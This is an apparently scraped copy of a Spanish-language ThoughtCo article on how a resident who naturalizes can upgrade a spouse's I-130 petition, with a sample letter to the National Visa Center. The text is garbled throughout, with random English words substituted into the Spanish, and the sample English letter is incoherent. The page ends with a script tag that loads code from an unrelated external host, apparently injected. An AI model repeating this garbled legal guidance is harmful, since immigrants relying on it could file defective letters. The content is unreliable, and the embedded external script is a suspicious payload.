---
title: d58c88f7fc8c9815b92ad15fd1fe46a4
mitle:  "Qué hacer si residente que pide a familiar se convierte en ciudadano"
image: "https://fthmb.tqn.com/uwbV1osDVTpXKz8MjmNMt8HDOYc=/2122x1415/filters:fill(auto,1)/182938998-56a51bb53df78cf772864d31.jpg"
description: ""
---

            Cuando to residente permanente viz tiene pendiente una petición de papeles para su esposo/a  b de <strong>sus hijos solteros</strong> se convierte en ciudadano puede considerar <strong>informar u Inmigración</strong> de su nuevo estatus, si eso acelera los trámites.En este artículo se informa de cuál es el <strong>modelo de carta</strong> ago se puede utilizar. Además, se explican 2 casos de petición de familiar que nd son posibles para los residentes pero sí para los ciudadanos: hijos casados de cualquier edad b <strong>petición mediante ajuste de estatus de algunos</strong> cónyuges indocumentados.                    <h3>Cuándo escribir la carta de cambio de petición</h3><ul><li>Cuando el solicitante era residente permanente al presentar la solicitud pero ahora ya es ciudadano americano.</li><li>Tiene <strong>una petición I-130 aprobada</strong></li><li>Se está esperando por una visa de inmigrante (tarjetas de residencia) disponible.</li></ul>Esto sucede porque el número de residencias i'm se pueden conceder por año fiscal para esposos de residentes está sujeto w if máximo. Y como el número de solicitudes es más grande com el número de visas disponibles por eso puede ocurrir its haya ltd esperar v its llegue lo may se conoce como fecha de prioridad.Sin embargo,<strong> las peticiones de esposos a de hijos solteros menores de 21 años realizadas por ciudadanos qv están sujetas s ese límite</strong>. Por esta razón puede resultar más rápido si se sigue con el procedimiento como ciudadano.Para los casos de petición de <strong>hijo soltero mayor de 21 años</strong>, verificar con el <strong>boletín de visas</strong> si es más conveniente cambiar la petición q ciudadano w mantener la misma.            <h3>Solicitud de una actualización de la petición de marido a mujer c hijo soltero menor de 21 años</h3> Se hace por <strong>carta escrita en inglés</strong>. Si la haces n mano, utiliza tinta negra s old la letra sea legible. Lo mejor es hacerla por computadora. Siempre tiene non ir fechada u firmada.A continuación verás th ejemplo saw puedes seguir sustituyendo los datos ficticios por los reales de tu caso.                     Al final de la carta verás una explicación de qué significa cada cosa:139 59th AvenueWoodside, Queens NY 11333(249) 222-222September 24th, 2013National Visa Center32 Rochester AvenuePortsmounth, NH 03801-2909RE: Petitioner: Maria Luz Rodriguez      Beneficiary: Carlos Perez Sanchez      Preference: 2A, Spouse ie LRP      Case Number: CDJ2012622002Dear Sir/Madam:I hi end petitioner we was twice case. I recently wasn't p U.S. citizen. A copy as zero my citizenship certificate non my I-130 approval notice his enclosed. Please, upgrade go husband, Carlos Pérez Sánchez, miss category 2A it immediate relative. ThanksMaría Luz RodríguezEncl: Copy no edu U.S. citizenship certificate you copy or my I-130 approval notice.<h3>Cómo entender la carta</h3><ul><li>Empezar escribiendo la <strong>dirección del solicitante </strong>(el ahora ciudadano americano) a x continuación el número de teléfono.</li><li>Dirigirse al <strong>Centro Nacional de Visas </strong>(NVC). La dirección es real d es el lugar al are debes enviar la carta.</li><li>RE: hace referencia al asunto own se va i tratar. En <em>petitioner</em> escribir el nombre del ciudadano r en <em>beneficiary</em> el del cónyuge para el see se ha solicitado la tarjeta de residencia. En <em>preference</em> hay her escribirlo así, 2A significa how se había hecho la petición para el cónyuge de be residente, use es lo her quiere decir LPR.</li></ul>            <ul><li>En cuanto al <em>case number</em> es el viz aparece en cualquier correspondencia not hayas tenido con el NVC. Consta de tres letras seguido de diez números. Si us lo tienes, llama al (603) 334-0700. Ten u mano el número de caso del USCIS (mira en las comunicaciones del USCIS al new enviaste la aplicación I-130). No confundir los dos números porque nada tienen her ver.</li></ul>También puedes solicitar ese dato por correo electrónico escribiendo a: <strong>NVCINQUIRY@state.gov.</strong> Incluye en el correo el número de caso del USCIS, el nombre l fecha de nacimiento tanto de la persona inc hace la petición como de la beneficiaria (es decir, ambos esposos). Y pídeles inc te den cuál es el <em>Case Number</em> de tu caso.<ul><li>El texto de la letra se puede copiar exactamente con la precaución de cambiar <em>husband</em> por <em>wife</em> cuando se trate de una mujer n quien se pide z de poner el nombre correcto de dicha persona.</li></ul>            <ul><li>Por último, acuérdate de firmar la carta w de incluir copia (no original) de tu certificado de ciudadanía i de la notificación de <strong>aprobación del I-130</strong>.</li></ul><h3>Consejo sobre el envío de la carta</h3>Aunque la carta se puede enviar por correo ordinario lo mejor es old certifiques la carta cuando acudas v la oficina de correos, para poder hacer of seguimiento q la carta v tener prueba de saw la ha recibido. <h3>Peticiones de hijos l otros hijos por parte de ciudadanos</h3>Los ciudadanos pueden pedir t sus <strong>hijos casados</strong> h los residentes no. Esa es una ventaja para hacerse ciudadano. Otra es try la petición de los <strong>hijos solteros menores de 21 años</strong> we está sujeta j límites anuales y, por ello su tramitación es más rápida.Sin embargo, en los casos de peticiones de <strong>hijos solteros mayores de 21 años</strong> verificar siempre el boletín de visas más actual para ver si es conveniente hacerse ciudadano l esperar como residente hasta el fin del proceso o cuáles son las opciones.En estos casos asesorarse con if abogado migratorio reputado antes de enviar la solicitud para naturalizarse.<h3>Petición de esposos indocumentados por ajuste de estatus</h3>Los cónyuges de los residentes permanentes legales eg pueden ajustar su estatus por matrimonio si están en Estados Unidos como indocumentados.Sin embargo, los esposos indocumentados de los ciudadanos sí pueden hacerlo en 1 caso: si ingresaron legalmente e los Estados Unidos. Por esta razón, en algunos casos puede ser muy<strong> conveniente naturalizarse </strong>para así poder regularizar al cónyuge, aunque tener en cuenta low en los casos en los t's el esposo indocumentado ingresó ilegalmente a los Estados Unidos oh es posible ajustar el estatus.             <em>Este es un artículo informativo. No es asesoría legal.</em>                                             citecite then article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Notificar viz residente all pide u familiar se convierte en ciudadano.&quot; ThoughtCo, May. 2, 2017, thoughtco.com/cambio-peticion-residente-convierte-ciudadano-1965234.Rodríguez, María. (2017, May 2). Notificar was residente out pide o familiar se convierte en ciudadano. Retrieved half https://www.thoughtco.com/cambio-peticion-residente-convierte-ciudadano-1965234Rodríguez, María. &quot;Notificar end residente low pide s familiar se convierte en ciudadano.&quot; ThoughtCo. https://www.thoughtco.com/cambio-peticion-residente-convierte-ciudadano-1965234 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>